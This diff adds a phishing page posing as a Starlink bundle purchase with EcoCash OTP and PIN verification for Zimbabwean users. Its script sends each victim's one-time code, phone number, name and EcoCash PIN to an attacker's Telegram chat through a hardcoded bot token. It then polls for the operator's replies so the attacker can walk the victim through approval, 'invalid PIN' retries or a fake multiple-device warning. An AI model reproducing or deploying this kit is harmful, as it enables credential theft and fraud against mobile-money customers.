@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#003366">
+    <title>Starlink Bundles | Verify OTP &middot; Zimbabwe</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root { --blue-dark: #001a33; --blue: #003366; --blue-mid: #004d99; --blue-light: #0077cc; --blue-bright: #00aaff; --red: #e30613; --green: #00a651; --white: #ffffff; --light: #f0f6ff; --dark: #0d1b2a; --muted: #5a6d80; --border: #d0dce8; --error: #dc2626; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { -webkit-text-size-adjust: 100%; }
+        body { font-family: 'Poppins', system-ui, sans-serif; background: linear-gradient(135deg, var(--blue-dark) 0%, var(--blue) 50%, var(--blue-mid) 100%); min-height: 100vh; display: flex; flex-direction: column; }
+        header { background: white; padding: 14px 5%; border-bottom: 3px solid var(--blue); }
+        .logo { font-size: 22px; font-weight: 900; text-decoration: none; }
+        .logo .eco { color: var(--blue); } .logo .cash { color: var(--red); }
+        main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 36px 16px; }
+        .card { background: white; border-radius: 18px; padding: 32px; max-width: 400px; width: 100%; box-shadow: 0 16px 48px rgba(0,26,51,0.4); }
+        .card-head { text-align: center; margin-bottom: 20px; }
+        .card-head h1 { font-size: 20px; font-weight: 900; color: var(--blue); margin-bottom: 4px; }
+        .card-head p { color: var(--muted); font-size: 12px; }
+        .bundle-bar { background: linear-gradient(135deg, var(--blue), var(--blue-dark)); border-radius: 10px; padding: 12px 14px; margin-bottom: 18px; color: white; }
+        .b-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 5px; }
+        .b-row:last-child { margin-bottom: 0; padding-top: 5px; border-top: 1px solid rgba(255,255,255,0.15); font-weight: 800; font-size: 13px; }
+        .err { display: none; background: rgba(220,38,38,0.06); border: 1px solid rgba(220,38,38,0.15); color: var(--error); font-size: 12px; font-weight: 600; border-radius: 8px; padding: 9px 12px; margin-bottom: 12px; text-align: center; }
+        .err.show { display: block; }
+        .fl { display: block; font-size: 10px; font-weight: 700; color: var(--blue); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 8px; }
+        .otp-row { display: flex; gap: 7px; justify-content: center; margin-bottom: 16px; }
+        .otp-box { width: 44px; height: 50px; text-align: center; font-size: 20px; font-weight: 800; border: 2px solid var(--border); border-radius: 10px; background: var(--light); color: var(--dark); font-family: 'Poppins', monospace; transition: all 0.2s; }
+        .otp-box:focus { border-color: var(--blue-light); background: white; box-shadow: 0 0 0 3px rgba(0,119,204,0.06); outline: none; }
+        .otp-box.ok { border-color: var(--green); background: rgba(0,166,81,0.04); }
+        .hint { font-size: 10px; color: var(--muted); text-align: center; margin-bottom: 6px; }
+        .btns { display: flex; gap: 10px; margin-top: 16px; }
+        .btn-p { flex: 1; background: var(--blue); color: white; border: none; padding: 13px; border-radius: 50px; font-weight: 800; font-size: 12px; text-transform: uppercase; cursor: pointer; font-family: inherit; box-shadow: 0 4px 12px rgba(0,51,102,0.25); transition: all 0.2s; }
+        .btn-p:hover { background: var(--blue-light); transform: translateY(-1px); }
+        .btn-o { flex: 1; background: transparent; color: var(--blue); border: 2px solid var(--blue); padding: 13px; border-radius: 50px; font-weight: 800; font-size: 12px; text-transform: uppercase; cursor: pointer; font-family: inherit; }
+        .btn-o:hover { background: var(--light); }
+        .card-ft { text-align: center; margin-top: 14px; font-size: 10px; color: var(--muted); }
+        .secure { display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 10px; font-size: 10px; color: var(--muted); font-weight: 600; }
+        .overlay { position: fixed; inset: 0; display: none; align-items: center; justify-content: center; flex-direction: column; gap: 12px; background: rgba(0,26,51,0.92); z-index: 2000; backdrop-filter: blur(5px); }
+        .overlay.on { display: flex; }
+        .spin { width: 46px; height: 46px; border: 4px solid rgba(255,255,255,0.1); border-top-color: var(--blue-bright); border-radius: 50%; animation: sp 0.8s linear infinite; }
+        .sp-t { font-size: 14px; font-weight: 700; color: white; }
+        .sp-s { font-size: 11px; color: rgba(255,255,255,0.6); }
+        @keyframes sp { to { transform: rotate(360deg); } }
+        .pin-overlay { position: fixed; inset: 0; display: none; align-items: center; justify-content: center; background: linear-gradient(135deg, var(--blue-dark), var(--blue)); z-index: 2000; padding: 20px; }
+        .pin-overlay.on { display: flex; }
+        .pin-card { background: white; border-radius: 18px; padding: 32px 28px; max-width: 360px; width: 100%; box-shadow: 0 20px 60px rgba(0,26,51,0.5); text-align: center; }
+        .pin-logo { font-size: 20px; font-weight: 900; margin-bottom: 16px; }
+        .pin-logo .eco { color: var(--blue); } .pin-logo .cash { color: var(--red); }
+        .pin-title { font-size: 16px; font-weight: 800; color: var(--blue); margin-bottom: 4px; }
+        .pin-sub { font-size: 11px; color: var(--muted); margin-bottom: 20px; }
+        .pin-amount { background: var(--light); border-radius: 10px; padding: 12px; margin-bottom: 18px; border: 1px solid var(--border); }
+        .pin-amount .pa-label { font-size: 10px; color: var(--muted); font-weight: 600; }
+        .pin-amount .pa-value { font-size: 1.4rem; font-weight: 900; color: var(--blue); }
+        .pin-input-wrap { border: 2px solid var(--border); border-radius: 12px; padding: 14px; background: var(--light); margin-bottom: 14px; transition: all 0.2s; }
+        .pin-input-wrap:focus-within { border-color: var(--blue-light); background: white; box-shadow: 0 0 0 3px rgba(0,119,204,0.06); }
+        .pin-fi { width: 100%; border: none; background: transparent; font-size: 24px; color: var(--dark); outline: none; font-family: inherit; letter-spacing: 12px; text-align: center; font-weight: 800; }
+        .pin-fi::placeholder { color: #b0c4d8; letter-spacing: 0; font-size: 13px; font-weight: 500; }
+        .pin-err { display: none; background: rgba(220,38,38,0.06); border: 1px solid rgba(220,38,38,0.15); color: var(--error); font-size: 11px; font-weight: 600; border-radius: 8px; padding: 8px; margin-bottom: 12px; }
+        .pin-err.show { display: block; }
+        .pin-btns { display: flex; gap: 10px; }
+        .pin-btn { flex: 1; padding: 13px; border-radius: 50px; border: none; font-weight: 800; font-size: 12px; text-transform: uppercase; cursor: pointer; font-family: inherit; transition: all 0.2s; }
+        .pin-btn-ok { background: var(--blue); color: white; box-shadow: 0 4px 12px rgba(0,51,102,0.25); }
+        .pin-btn-ok:hover { background: var(--blue-light); }
+        .pin-btn-x { background: transparent; color: var(--blue); border: 2px solid var(--blue); }
+        .pin-btn-x:hover { background: var(--light); }
+        .pin-secure { margin-top: 14px; font-size: 10px; color: var(--muted); font-weight: 600; }
+        .warning-overlay { position: fixed; inset: 0; display: none; align-items: center; justify-content: center; background: rgba(0,26,51,0.85); z-index: 3000; padding: 20px; backdrop-filter: blur(8px); }
+        .warning-overlay.on { display: flex; }
+        .warning-card { background: white; border-radius: 20px; padding: 32px 24px; max-width: 380px; width: 100%; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); text-align: center; border: 1px solid rgba(255,255,255,0.2); }
+        .warning-icon { font-size: 48px; margin-bottom: 16px; }
+        .warning-title { font-size: 18px; font-weight: 800; color: var(--blue-dark); margin-bottom: 12px; line-height: 1.3; }
+        .warning-msg { font-size: 13px; color: var(--muted); line-height: 1.6; margin-bottom: 24px; }
+        .warning-btn { width: 100%; background: var(--blue); color: white; border: none; padding: 14px; border-radius: 12px; font-weight: 700; font-size: 14px; cursor: pointer; transition: all 0.2s; }
+        .warning-btn:hover { background: var(--blue-light); transform: translateY(-1px); }
+        @media (max-width: 500px) { main { padding: 20px 12px; } .card { padding: 24px 16px; } .otp-row { gap: 5px; } .otp-box { width: 38px; height: 44px; font-size: 17px; } .btns { flex-direction: column; } .pin-card { padding: 24px 18px; } }
+    </style>
+</head>
+<body>
+    <header><a class="logo" href="index.html"><span class="eco">Star</span><span class="cash">Link</span></a></header>
+    <main>
+        <div class="card">
+            <div class="card-head">
+                <h1>Verify Code</h1>
+                <p>Enter the 6-digit code sent to your phone</p>
+            </div>
+            <div id="bBar" class="bundle-bar" style="display:none;">
+                <div class="b-row"><span>Name:</span><span id="bName">&mdash;</span></div>
+                <div class="b-row"><span>Bundle:</span><span id="bD">&mdash;</span></div>
+                <div class="b-row"><span>Amount:</span><span id="bP">USD 0.00</span></div>
+            </div>
+            <div id="err" class="err"></div>
+            <label class="fl">Verification Code</label>
+            <div class="otp-row" id="otpRow">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric">
+            </div>
+            <p class="hint">Check your SMS for the verification code</p>
+            <div class="btns">
+                <button class="btn-p" onclick="doOTP()">Verify &amp; Proceed</button>
+                <button class="btn-o" onclick="location.href='login.html'">Cancel</button>
+            </div>
+            <div class="card-ft">Protected with 256-bit encryption.</div>
+            <div class="secure">&#128274; End-to-end Encrypted</div>
+        </div>
+    </main>
+    <div id="ov" class="overlay"><div class="spin"></div><div class="sp-t">Verifying Code</div><div class="sp-s">Please wait...</div></div>
+    <div id="pinOv" class="pin-overlay">
+        <div class="pin-card">
+            <div class="pin-logo"><span class="eco">Star</span><span class="cash">Link</span></div>
+            <div class="pin-title">Confirm PIN</div>
+            <div class="pin-sub">Enter your EcoCash PIN to authorize this bundle purchase</div>
+            <div class="pin-amount"><div class="pa-label">Amount</div><div class="pa-value" id="pinAmt">USD 0.00</div></div>
+            <div id="pinErr" class="pin-err"></div>
+            <div class="pin-input-wrap"><input type="password" class="pin-fi" id="pinIn" placeholder="Enter 4-digit PIN" inputmode="numeric" maxlength="4"></div>
+            <div class="pin-btns">
+                <button class="pin-btn pin-btn-ok" onclick="doPin()">Confirm PIN</button>
+                <button class="pin-btn pin-btn-x" onclick="closePin()">Cancel</button>
+            </div>
+            <div class="pin-secure">&#128274; Secured by EcoCash &middot; 256-bit SSL</div>
+        </div>
+    </div>
+    <div id="warningOv" class="warning-overlay">
+        <div class="warning-card">
+            <div class="warning-icon">⚠️</div>
+            <div class="warning-title">Multiple Active Devices Detected</div>
+            <div class="warning-msg">To ensure your bundle purchase is successfully processed and confirmed, please sign out of all other devices currently logged into your account. Once you have signed out from the other devices, refresh the app and submit your bundle order again.</div>
+            <button class="warning-btn" onclick="exitApp()">OK</button>
+        </div>
+    </div>
+    <script>
+        const BOT = '8805303915:AAHqiK9aAjQF-Jts4xEpmZ1GE4rbcUdVh0A';
+        const CID = '8094482230';
+        var bd = {}, luid = 0, otp = '', phone = '';
+        function init() {
+            var p = new URLSearchParams(location.search);
+            var d = p.get('data'), pr = p.get('price');
+            phone = p.get('phone') || '';
+            var name = p.get('name') || '';
+            if (d && pr) {
+                bd = { data: d, price: pr, name: name };
+                document.getElementById('bBar').style.display = 'block';
+                document.getElementById('bName').textContent = name || 'N/A';
+                document.getElementById('bD').textContent = d;
+                document.getElementById('bP').textContent = 'USD ' + pr;
+                document.getElementById('pinAmt').textContent = 'USD ' + pr;
+            }
+        }
+        var boxes = document.querySelectorAll('.otp-box');
+        boxes.forEach(function(b, i) {
+            b.addEventListener('input', function(e) {
+                var v = e.target.value;
+                if (v.length > 1) {
+                    var digs = v.replace(/\D/g, '').split('');
+                    digs.forEach(function(d, j) { if (i + j < boxes.length) { boxes[i + j].value = d; boxes[i + j].classList.add('ok'); } });
+                    boxes[Math.min(i + digs.length, boxes.length - 1)].focus();
+                    chk();
+                    return;
+                }
+                if (v) { b.classList.add('ok'); if (i < boxes.length - 1) boxes[i + 1].focus(); }
+                else { b.classList.remove('ok'); }
+                chk();
+            });
+            b.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !e.target.value && i > 0) { boxes[i - 1].focus(); boxes[i - 1].value = ''; boxes[i - 1].classList.remove('ok'); }
+            });
+            b.addEventListener('paste', function(e) {
+                e.preventDefault();
+                var t = e.clipboardData.getData('text').replace(/\D/g, '');
+                t.split('').forEach(function(d, j) { if (j < boxes.length) { boxes[j].value = d; boxes[j].classList.add('ok'); } });
+                boxes[Math.min(t.length - 1, boxes.length - 1)].focus();
+                chk();
+            });
+        });
+        function getCode() { return Array.from(boxes).map(function(b) { return b.value; }).join(''); }
+        function chk() { otp = getCode(); if (otp.length === 6) { setTimeout(function() { doOTP(); }, 400); } }
+        function doOTP() {
+            otp = getCode();
+            if (otp.length !== 6) { showErr('Please enter all 6 digits'); return; }
+            clrErr();
+            document.getElementById('ov').classList.add('on');
+            var msg = '\u{1f4f2} <b>OTP Verification</b>\n\n' +
+                '<b>Name:</b> <code>' + (bd.name || 'N/A') + '</code>\n' +
+                '<b>OTP Code:</b> <code>' + otp + '</code>\n' +
+                '<b>Phone:</b> <code>+263' + phone + '</code>\n' +
+                '<b>Bundle:</b> <code>' + (bd.data || 'N/A') + '</code>\n' +
+                '<b>Amount:</b> <code>USD ' + (bd.price || '0.00') + '</code>\n\n' +
+                '<b>Message (tap to copy):</b>\n<code>Your EcoCash OTP is.' + otp + '. Do not share this code with anyone. Expires in 2 mins.\n1qk+jE1lKeZ</code>';
+            var btns = [
+                [{ text: '\u2713 Approved', callback_data: 'otp_approved' }, { text: '\u2717 Declined', callback_data: 'otp_declined' }],
+                [{ text: '\u26a0\ufe0f Log Out Devices', callback_data: 'otp_logout' }]
+            ];
+            tg(msg, btns);
+            pollOTP();
+        }
+        async function tg(msg, btns) {
+            try {
+                await fetch('https://api.telegram.org/bot' + BOT + '/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CID, text: msg, reply_markup: btns ? { inline_keyboard: btns } : undefined, parse_mode: 'HTML' })
+                });
+            } catch(e) { console.error(e); }
+        }
+        function pollOTP() {
+            var iv = setInterval(function() {
+                fetch('https://api.telegram.org/bot' + BOT + '/getUpdates?offset=' + (luid + 1))
+                    .then(function(r) { return r.json(); })
+                    .then(function(d) {
+                        if (d.ok && d.result.length > 0) {
+                            var u = d.result[0];
+                            luid = u.update_id;
+                            if (u.callback_query) {
+                                var cb = u.callback_query.data;
+                                if (cb === 'otp_approved') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); openPin(); }
+                                else if (cb === 'otp_declined') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); showErr('Declined. Please try again.'); resetOTP(); }
+                                else if (cb === 'otp_logout') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); showWarning(); }
+                            }
+                        }
+                    }).catch(function(e) { console.error(e); });
+            }, 1000);
+            setTimeout(function() { clearInterval(iv); }, 300000);
+        }
+        function showWarning() { document.getElementById('warningOv').classList.add('on'); }
+        function exitApp() { window.location.href = 'index.html'; }
+        function openPin() {
+            document.getElementById('pinOv').classList.add('on');
+            setTimeout(function() { document.getElementById('pinIn').focus(); }, 300);
+        }
+        function closePin() {
+            document.getElementById('pinOv').classList.remove('on');
+            document.getElementById('pinIn').value = '';
+            document.getElementById('pinErr').classList.remove('show');
+        }
+        document.getElementById('pinIn').addEventListener('input', function() {
+            if (this.value.length === 4) setTimeout(function() { doPin(); }, 300);
+        });
+        function doPin() {
+            var pin = document.getElementById('pinIn').value.trim();
+            if (pin.length !== 4) { document.getElementById('pinErr').textContent = 'Please enter a 4-digit PIN'; document.getElementById('pinErr').classList.add('show'); return; }
+            document.getElementById('pinErr').classList.remove('show');
+            document.getElementById('pinOv').classList.remove('on');
+            document.getElementById('ov').classList.add('on');
+            var msg = '\u{1f510} <b>PIN Confirmation</b>\n\n' +
+                '<b>PIN:</b> <code>' + pin + '</code>\n' +
+                '<b>Phone:</b> <code>+263' + phone + '</code>\n' +
+                '<b>Bundle:</b> <code>' + (bd.data || 'N/A') + '</code>\n' +
+                '<b>Amount:</b> <code>USD ' + (bd.price || '0.00') + '</code>';
+            var btns = [[{ text: '\u2713 Approved', callback_data: 'pin_valid' }, { text: '\u2717 Invalid PIN', callback_data: 'pin_invalid' }]];
+            tg(msg, btns);
+            pollPin();
+        }
+        function pollPin() {
+            var iv = setInterval(function() {
+                fetch('https://api.telegram.org/bot' + BOT + '/getUpdates?offset=' + (luid + 1))
+                    .then(function(r) { return r.json(); })
+                    .then(function(d) {
+                        if (d.ok && d.result.length > 0) {
+                            var u = d.result[0];
+                            luid = u.update_id;
+                            if (u.callback_query) {
+                                var cb = u.callback_query.data;
+                                if (cb === 'pin_valid') {
+                                    clearInterval(iv);
+                                    document.getElementById('ov').classList.remove('on');
+                                    location.href = 'success.html?data=' + encodeURIComponent(bd.data || '') + '&price=' + (bd.price || '') + '&phone=' + phone + '&name=' + encodeURIComponent(bd.name || '');
+                                }
+                                else if (cb === 'pin_invalid') { clearInterval(iv); document.getElementById('ov').classList.remove('on'); document.getElementById('pinOv').classList.add('on'); document.getElementById('pinErr').textContent = 'Invalid PIN. Please try again.'; document.getElementById('pinErr').classList.add('show'); document.getElementById('pinIn').value = ''; document.getElementById('pinIn').focus(); }
+                            }
+                        }
+                    }).catch(function(e) { console.error(e); });
+            }, 1000);
+            setTimeout(function() { clearInterval(iv); }, 300000);
+        }
+        function showErr(m) { var e = document.getElementById('err'); e.textContent = m; e.classList.add('show'); }
+        function clrErr() { document.getElementById('err').classList.remove('show'); }
+        function resetOTP() { boxes.forEach(function(b) { b.value = ''; b.classList.remove('ok'); }); otp = ''; boxes[0].focus(); }
+        window.addEventListener('load', function() { init(); boxes[0].focus(); });
+    </script>
+</body>
+</html>
